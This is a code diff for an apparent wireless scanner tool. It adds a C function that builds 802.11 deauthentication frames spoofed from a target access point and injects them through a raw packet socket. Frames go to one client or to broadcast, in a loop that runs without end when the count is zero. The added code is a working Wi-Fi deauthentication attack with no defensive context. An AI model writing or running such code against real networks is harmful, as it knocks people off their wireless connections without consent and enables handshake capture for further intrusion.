@@ -4,6 +4,10 @@
 #include <string.h>
 #include <unistd.h>
 #include <sys/time.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <linux/if_packet.h>
 #include <time.h>
 
 // Default channel list (1-14)
@@ -301,4 +305,82 @@ int scanner_select_target(struct scanner_state *state) {
                 state->aps[idx].channel);
 
     return idx;
+}
+
+// Build and send a deauthentication frame
+int scanner_send_deauth(struct capture_handle *cap,
+                        const uint8_t *target_bssid,
+                        const uint8_t *client_mac,
+                        int count) {
+    // Deauth frame structure (802.11 management frame)
+    // Frame Control: 0x00C0 (deauthentication)
+    // Duration: 0x0000
+    // Address 1: Client (or broadcast FF:FF:FF:FF:FF:FF)
+    // Address 2: AP MAC (source)
+    // Address 3: AP MAC (BSSID)
+    // Sequence Control: 0x0000
+    // Reason Code: 0x0007 (Class 3 frame from non-associated station)
+
+    uint8_t deauth_frame[26];
+    memset(deauth_frame, 0, sizeof(deauth_frame));
+
+    // Frame Control: Deauthentication (0x00C0)
+    deauth_frame[0] = 0xC0;
+    deauth_frame[1] = 0x00;
+
+    // Duration
+    deauth_frame[2] = 0x00;
+    deauth_frame[3] = 0x00;
+
+    // Address 1: Client or broadcast
+    if (client_mac) {
+        memcpy(deauth_frame + 4, client_mac, 6);
+    } else {
+        // Broadcast
+        memset(deauth_frame + 4, 0xFF, 6);
+    }
+
+    // Address 2: AP MAC (source)
+    memcpy(deauth_frame + 10, target_bssid, 6);
+
+    // Address 3: AP MAC (BSSID)
+    memcpy(deauth_frame + 16, target_bssid, 6);
+
+    // Sequence Control
+    deauth_frame[22] = 0x00;
+    deauth_frame[23] = 0x00;
+
+    // Reason Code: 7 (Class 3 frame from non-associated station)
+    deauth_frame[24] = 0x07;
+    deauth_frame[25] = 0x00;
+
+    int sent = 0;
+    for (int i = 0; i < count || count == 0; i++) {
+        // Inject the frame using raw socket
+        struct sockaddr_ll addr;
+        memset(&addr, 0, sizeof(addr));
+        addr.sll_family = AF_PACKET;
+        addr.sll_ifindex = 0;  // Will be set by the interface
+        addr.sll_halen = 6;
+        memcpy(addr.sll_addr, target_bssid, 6);
+
+        // Get interface index
+        struct ifreq ifr;
+        memset(&ifr, 0, sizeof(ifr));
+        strncpy(ifr.ifr_name, cap->iface, IFNAMSIZ - 1);
+        if (ioctl(cap->fd, SIOCGIFINDEX, &ifr) < 0) {
+            break;
+        }
+        addr.sll_ifindex = ifr.ifr_ifindex;
+
+        if (sendto(cap->fd, deauth_frame, sizeof(deauth_frame), 0,
+                   (struct sockaddr *)&addr, sizeof(addr)) > 0) {
+            sent++;
+        }
+
+        // Small delay between packets
+        usleep(10000); // 10ms
+    }
+
+    return sent;
 }
